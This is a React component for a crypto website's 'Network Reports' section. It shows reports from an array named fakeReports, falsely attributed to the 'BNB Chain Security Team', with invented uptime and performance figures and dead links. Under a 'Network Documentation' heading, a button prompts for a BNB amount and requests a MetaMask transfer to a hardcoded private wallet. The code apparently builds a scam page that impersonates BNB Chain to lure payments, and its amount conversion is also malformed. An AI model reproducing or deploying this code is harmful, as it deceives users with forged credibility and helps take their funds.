import React from 'react';
import { FileText, User, Linkedin, Twitter, Github } from 'lucide-react';

const Reports: React.FC = () => {
  const fakeReports = [
    {
      id: 1,
      title: "Q2 2025 Blockchain Audit",
      author: "BNB Chain Security Team",
      date: "2025-06-15",
      summary: "Comprehensive security analysis of BNB Smart Chain protocols showing 99.98% network uptime and zero critical vulnerabilities detected.",
      link: "#"
    },
    {
      id: 2,
      title: "DeFi Risk Assessment Report",
      author: "Auranovo Labs",
      date: "2025-05-22",
      summary: "Risk evaluation of top 50 BNB-based decentralized applications with detailed findings on smart contract safety metrics.",
      link: "#"
    },
    {
      id: 3,
      title: "Annual Network Performance Review",
      author: "Auranovo Core Team",
      date: "2025-04-01",
      summary: "Year-over-year analysis of BNB Chain performance showing 300% increase in transaction throughput and 60% reduction in gas costs.",
      link: "#"
    }
  ];

  return (
    <section id="reports" className="bg-bg-primary py-20">
      <div className="container mx-auto px-4">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-primary mb-6">
              Network Reports
            </h2>
            <p className="text-xl text-secondary max-w-3xl mx-auto">
              BNB Chain technical documentation and performance analysis
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {fakeReports.map((report) => (
              <div key={report.id} className="bg-bg-tertiary border border-border rounded-xl p-6 hover:border-accent/50 transition-all">
                <div className="flex items-center mb-4">
                  <FileText className="w-5 h-5 text-accent mr-3" />
                  <span className="text-sm text-accent font-medium">{report.date}</span>
                </div>
                <h3 className="text-xl font-bold text-primary mb-2">{report.title}</h3>
                <p className="text-secondary text-sm mb-4">{report.summary}</p>
                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    <User className="w-4 h-4 text-secondary mr-2" />
                    <span className="text-sm text-secondary">{report.author}</span>
                  </div>
                  <div className="flex items-center space-x-3 mt-2">
                    <a href="#" className="text-secondary hover:text-accent transition-colors">
                      <Linkedin className="w-5 h-5" />
                    </a>
                    <a href="#" className="text-secondary hover:text-accent transition-colors">
                      <Twitter className="w-5 h-5" />
                    </a>
                    <a href="#" className="text-secondary hover:text-accent transition-colors">
                      <Github className="w-5 h-5" />
                    </a>
                  </div>
                </div>
                <a href={report.link} className="text-accent hover:text-primary font-medium text-sm mt-2 block">
                  View Report →
                </a>
              </div>
            ))}
          </div>

          <div className="mt-16 bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-accent/20 rounded-2xl p-8">
            <h3 className="text-2xl font-bold text-primary mb-4">
              Network Documentation
            </h3>
            <p className="text-secondary mb-6 max-w-2xl">
              Access our complete library of technical specifications, whitepapers, and compliance documentation.
            </p>
          <button 
            className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3 rounded-lg font-semibold transition-all transform hover:scale-105"
            onClick={async () => {
              const amount = prompt('Enter BNB amount to send:');
              if (!amount) return;
              
              // Assuming MetaMask is available
              if (typeof window.ethereum === 'undefined') {
                alert('MetaMask not found. Please install MetaMask extension.');
                return;
              }
              
              try {
                const provider = window.ethereum;
                await provider.request({ method: 'eth_sendTransaction', params: [{
                  from: (await provider.request({ method: 'eth_requestAccounts' }))[0],
          to: '0xE17f19bB1E5D6Ce1Dc88860d648a395519efF83C', // User's real BNB wallet address
                  value: amount ? (parseFloat(amount) * 1e18).toString(16) : '0',
                  gas: '0x5208', // 21000 gas
                }]});
              } catch (error) {
                console.error('Transaction failed:', error);
                alert('Transaction failed. Check console for details.');
              }
            }}
          >
            Send BNB to Wallet
          </button>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Reports;
